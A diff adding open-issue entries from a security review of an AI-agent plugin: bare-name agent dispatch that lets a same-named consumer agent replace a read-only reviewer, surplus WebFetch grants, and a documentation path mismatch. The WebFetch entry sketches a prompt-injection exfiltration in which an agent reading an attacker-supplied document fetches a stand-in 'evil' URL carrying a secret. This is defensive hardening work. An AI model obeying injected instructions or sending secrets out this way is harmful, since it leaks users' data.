@@ -56,6 +56,65 @@
 
 ## Open
 
+### `[plugin]` `PREPROD-L7-BARE-DISPATCH` — the plugin dispatches its agents by bare name, so a consumer's same-named agent wins → #417
+
+- *Context:* found 2026-08-01 by security review during PLUGIN-PREPROD-001 PR 4,
+  and **pre-existing**. Plugin agents register under a scoped identifier
+  (`aidoc-flow:code-reviewer`), so no definition is overwritten — but Claude Code
+  resolves a **bare** name by scope precedence, and a plugin's `agents/` is the
+  lowest of five (managed 1, `--agents` 2, `.claude/agents/` 3,
+  `~/.claude/agents/` 4, plugin 5); the higher-priority location wins. Every
+  dispatch reference this plugin ships is bare: `agents/pm-orchestrator.md:55`
+  (the delegation table of the one agent holding `Task`),
+  `skills/review-team/SKILL.md:60-71` (the lens → agent map), the same block in
+  the eight `doc-*-audit` skills, and `skills/doc-brd/SKILL.md:176`
+  (`subagent_type=requirements-analyst`) — 28 `subagent_type=` occurrences across
+  `skills/`.
+- *Impact:* a consumer who defines `code-reviewer` at any higher scope has the
+  plugin's read-only gate silently replaced by their own agent, which may hold
+  `Write`/`Edit`. `docs/AGENTS.md:32` states read-only as a security property, and
+  it is defeated with no error, warning, or log line.
+- *Fix shape:* namespace the dispatch **references**, not the definitions —
+  `` `code-reviewer` `` → `` `aidoc-flow:code-reviewer` `` across the delegation
+  and lens tables. Touches no agent filename, so it churns neither the
+  `tests/scripts/test-acceptance.sh:1719,2171` expectation strings nor the other
+  surfaces a rename would. **Verify first that `subagent_type` accepts the scoped
+  form**; the docs confirm it for `--agent` and @-mention and show scoped
+  identifiers (`my-plugin:review:security`), but do not state it for
+  `subagent_type`. If it does not, renaming the definitions is the only fix left
+  and this reopens as a rename.
+- *Not broken:* installation does not shadow or overwrite a consumer's agent, and
+  PR 4's `docs/AGENTS.md` §"Naming" documents the hazard for a human reader. This
+  entry is the machine-facing half.
+- *Stage:* after PLUGIN-PREPROD-001; not a release blocker for the `0.25.0` cut.
+
+### `[plugin]` `PREPROD-AGENT-WEBFETCH` — `WebFetch` is granted to 9 of 11 agents and used by no workflow
+
+- *Context:* found 2026-08-01 by security review during PLUGIN-PREPROD-001 PR 4.
+  `WebFetch` appears in 9 of 11 `agents/*.md` frontmatters and in **zero** skill
+  or agent bodies — no shipped workflow instructs any agent to fetch a URL. For
+  document-authoring agents whose inputs are a local template plus a local seed
+  file it is surplus, and it is the canonical prompt-injection exfiltration
+  primitive: an agent reading an attacker-supplied requirements document can be
+  induced to fetch `https://evil/?d=<secret>`.
+- *Fix shape:* drop `WebFetch` from the agents with no fetching workflow. Note
+  the counter-argument that keeps this LOW rather than MEDIUM — those agents also
+  hold `Bash`, so `curl` remains reachable; removing `WebFetch` narrows the
+  easiest path, not the only one. A real fix pairs it with the `Bash` question.
+- *Stage:* unscheduled.
+
+### `[docs]` `PREPROD-PLAN-TESTPATH` — the PR 4 plan's file table names a path that does not exist
+
+- *Context:* `plans/PLUGIN-PREPROD-001-PLAN.md:326` names
+  `tests/conformance/test_agent_frontmatter.py`; it shipped at
+  `tests/conformance/platforms/test_agent_frontmatter.py`, beside the 18 other
+  plugin-platform checks. The `platforms/` placement is correct — the adjacent
+  `:325` row (`test_plugin_hook_safety.py`, PR 1) is the one that is arguably
+  misplaced. Not fixed in PR 4 because editing a `plans/*-PLAN.md` makes it a
+  governance PR under the ≤3-doc-surface rule.
+- *Fix shape:* amend `:326` during PR 5, which closes the plan out anyway.
+- *Stage:* PR 5.
+
 ### `[plugin]` `SAGA-ALL-BRANCHES-FAILED-CLOSES` — a review where every lens failed still closes at exit 0
 
 - *Context:* found 2026-08-01 by review during PLUGIN-PREPROD-001 PR 3, and
